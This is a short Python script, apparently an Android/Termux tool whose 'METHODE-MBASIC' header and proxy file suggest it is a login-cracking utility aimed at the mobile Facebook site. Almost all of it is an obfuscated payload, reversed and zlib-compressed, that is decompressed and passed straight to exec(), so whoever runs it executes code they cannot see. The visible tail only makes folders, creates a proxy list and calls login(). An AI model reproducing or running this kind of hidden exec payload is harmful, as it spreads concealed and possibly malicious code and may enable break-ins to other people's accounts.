_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(b'\x13E\xef\xc7\x9f\xd2\x14\x02O\xfb~\x82\x1d\x1c\x19R\x92\x97\x93h\x9c\xa1)D\xfd`o\xa1\xce\n\\\x9dO@{7|;}\xbd\x08\xe0\x03aMx\xc3s\x94\x9b\xfbM\x13.?\r-c\xee\'[}\xaf"\x1b,\x00\xd1N\x88[\xee\x9f\x1d\xe9>>\xed;\xd2w\xa0\xc9\x8230\x80s\xb9\xe8W\xe8\x0b\xff\xc8h\xe8\x85\xdd\xe2\xd5\xc1\xf5\xe6\xfe\xbf./\xdf\x14W\xa8\xf5J\xef\xe3.\xbd\xbd^o/^\xcf\x14\xb8\xd3\x93\xc5\xc5\xfe\xe3\xe3\xbd\xc7\xa3\xe3\xbd{N\xf4\xc2\xc6t\x9a\x84J\xbd@\x14\x96\x18\xf0d\xb1\x81\xbe\xff\x93\xed\\\x1f\xbc\xb76\xaa<0\xde\xd1\x83m\xbfv\x9d\r\xbf\xcf\xcb\xf1\xfc\x1a\x15{\x8e\xceN\xcfN\x8e\x0f\x1c8\xb3\x7f\xc3\xb1\xa7\xe0\x81\xe2iK:\x9bnf\xdc\xb0-\x08\x89\x05\xd66C7\x1c_w\xa2n\x1ei\x03\xb6\xb4\xf0f\xc2\x1c\xfdv\xc2\xaf\xea\xed\x85\x1f\xb0\x0b\xb2\x18\xf7\xaf\x00\x7f\xea.G_\xd3\xbd/\x80CU\xb1E\xf3\x19\xfd\x98\x11g8+\x91\x83\xce\x96\x8a\xec.(\xacj\xdd\x0fN\xd9\x11\xa1\xbc\xe5\xb7\xe8\xfc\x10\xf7\x02\xcf)\x92\xa0O5\x17\x0f|pkhn\xe7%h\xaf\xd3\xfe\xfd\x1a\xe2\xc0\x15\xa2\x1c\xbe_\x1dp\xbc/[\xf5]k\xc0\x8b\xb7*5\x04\x02\xac2\xb0a\xaf\x9e\xa8\x1d\x94o\xfb\x90|\x80z0G6D\xd5\xe5\xbe\x97\xf2\x15\x88\x03p\\\x00\xec\x00`.\xe2\x0b\x8b6@\x0f@HRK\xe8<\x8eY\xc3\xae\t\xcd\xd8V\x07\xce\xc8\xd3R\xe2\x9fN\x8d+\x00\xc6h\xa4c\xe0\x12\xe1\x1b\xee\xa7\xa6\xf3h\xeb\xa5\xdby^\n\xcd\xf9]6zm\x17\x10u-\xd1d~\x07\xa6\\t\xf5\x0f\x16\xf8\xe3\x9ffLhA\x81\xdf\xc24%\x05\x06\xc5\x04\x0e\x82\x83\xbf\xdd\x87((\x8d\xad^\x9b_\x02z\xe3\x1cv\xa5\x10\x8cP\x10\xa1\xf6c\xed!KB\xfd\x0b\xf0\xa7\xddZ.\x8e\xb5q\xd4\xa2\xed\xb9\xe5ND\x8b\xa3<b\xc0-\xff]\x04\xff\xeb\xb0O\xb3OEt\xaa\xd7\x1e\xc8\xb6<\xf9\xf3\xc4\xba\x0e\xea\x96\xd2\x96l@4/V\x1c\r5}\xca\xb4\xd9\x98y\xf7\x81\xe9\x1c\x8b\x0b"\xd7J%\x1b\x82&4\xa6L\x10\x94?zJa\xd7\x96\xf9\xe9:<]\xd8|zY\xe6\x86r{\xafI\xbbH\xbe\xd9H\xe5\xa0\xbe\xdc\x15G\xd4\xed\xfd[\x86\x1a!\x07J\xcf\xa8\x13\x08&#\x19F\xbeM\xf2\r\xdc\n\xc1\xde\xed\xc9\xc2\xc8\x86\xb65\x19t\x14\x14-C\xda[N\x96\xbc\x80`\xf1\x82\x0f\xc9\x85\xe6w\x81\xe6 \xc1D.^\xb9\x1er\xfa\xf2\xb1\xb58\x01\x18|\x88?\xeb$\x9b\x18\x13q\xa3<h\x98\xce\xe4\xa4\x1fH\x1cy\xf0-\xf5\xe3\xb8\x13T\xbeR\xd9h\x9f\xac.\x13\xbf\x01\xfb\xc8\xc3\x0e\x0c\xb5\x12\x89\x93\x0c5\x0bbd\n\xbcH#\xf3\xd0\xf3\xc3\xc9\x07Xk.\x19\xa2\x9d\xd4\xea\x10\xe7\xc0\xd3"\xb1M\x13E}y\x9dJ\xf2\xb8\r\x0cc\xa8j\xee\xf9L\xa9\x1f\xdb4C!EJ\x8c\xd2Ei\xae\x0f\xbe2H\xc5\xc4{\x8e\xa7\x9b\xf6\x87\xdf\xdbE@6\xfdK,\xd7\x9c\xeb*\x17=k\x12:\xcd5\x8cx\xdc(3\xa3\'t\xe0\x14\xbe\xbd\xdc\xbd{\x7f\x02j\x13^[e(?)\xba\xdej&\xf2\x8b\xa4\xd9\xbd\xbf\x7f\x04U\xf6~<\xf5\xed\xf8C^x%L\xb7V4\x07\xa8K\xcd\x19B2c\xbc\x9d\xe0\x13\xe3\x19\x119LRM\xb7\x8e\xd4\x9b\xbfR\x1a\x03[n9T\xe6\x8ah\x05\xf5\xb5 \x99y\xbc\xda\x8c\x84;\x96i+Np\xcc6\xe7;\xd2\x84L\x96dJ\xe4;\xe3\t\xb1B\xc6\x8a\xe3Y\x02\xe1CX\xd3!\xa9\xce.\xc4\x03\x02D\xc9\xc3\x19\x92*\xb0\xae8S39\xde\x01Q\xb6, \xbb>\xb3=pP\xc6\xa3\xe3\xa5\x9b=\t\xf3\x14\xc8.\x98\xb3N\x13f\x97c\xbapY\xd0\xf8fV\r\xac\xc4_;\r0\x05)\x10[\x02\xba0!\x96\t\x9e\x10##\x82\xa6idD\xbchf\x86QM`p\xf4I\xf2T\xf6\xe5\x8e\x9c\xe5\x9b\xe5\x8c\xf0u\x94\n\xb1\x1cy \xf4\xdb\xd9\xe5V\x9f\x1f\x17\xb4\x9e\xc2\xce\xaf\xc0l\x11\x92\xcaXFUML\xe9\x85\xd0\xcf\x1b\tP\x84\xc3\xc8\xcd\xc1\xa4\x05\xf0c\x15S]\x01\xe8w\xbe\xbdK[\xc6\x8a\xd4\x94\xd7\x19\x8d`(\x9c\xb5y\x1f\x95\x11\t\x14B\xc7Bc\x92U\xfb\xeb\xc6\xd0\x95\xdeW$C\x0c\xcbRt\xaa3\x8aS&7\x03\xcbkb\r\xbf\x1d;\xf4\x9fB\x90Z\xf9\x1f~\x91\x8dO\xe5h\xa7B\xec\x92\xd0\x8b\x12\xa4\xca\xbb\xa6L\xe3\xd9\xfbKQ\x9e\xda\x883\xbf\x87\x18\x8erAL\x0f\xabpL\xd6\xa8nN\x8d\xaako\xa3Kj\x8a\xf5\xae\xa4\x9d\xee\x94w(OP\xb8\x9f\xc6\xaf\xb0\x03OZ\xcb\xc9lv\x8c/#\xb0\xd8a\xd26]\x85/\'|\xac\t\xb0\xaa\x85\xc9?kZ\x0eO\xd5\x7f\x16X\x1a!\x83\xd8Q+\xd6\xae\xac\n\xdc\xfdt{\xb4=\xb8r\x86\xdctXk\xd5YY=\x9d\x844\x1b\x9b\x93\xe5\xf5\xd5\xf2\xf4\x03\xd7/V\x85\x1b\xde\xe4\x1a\x19\x8a\xe6I\xb5\x13&\xd1:\x97\xa7\xb0|0\xc5\xa3\xaa8\xd1\xa6\x88\xa8\xaa\x0c\x1a\x11\x82\xa6BU\x13<\xc2\x91J\x05\x8d\xec\x1f""(\x91\x90\x85*%\xc61JM\xec\x1f\xf6\x16|\xe4\x8f,\xb0\x11I\x85\x11\x1c\xd1\x92x\xfds\xc2\xe7\x92"\x08,1\xfb\x0c;Y6\xean\xcaC\xb0\x8f`\x9e\xd6=\xcf\xd8\x0c3\xd8\x17\xb03\xd4\xbeRK$I9\xb2\x8ah0\xd7\x00\xeb`\xd1K\xa2\xb0m\xa0\xb2\x08@\xean$\xe2rKT\x91\xc0!\x05>\x9d\xfe\x146\xdbn\xebW\xe5\x9cx'))

#------------------[ METHODE-MBASIC-2 ]-------------------#
	

#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':
	try:os.mkdir('/sdcard/HARRYv6')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
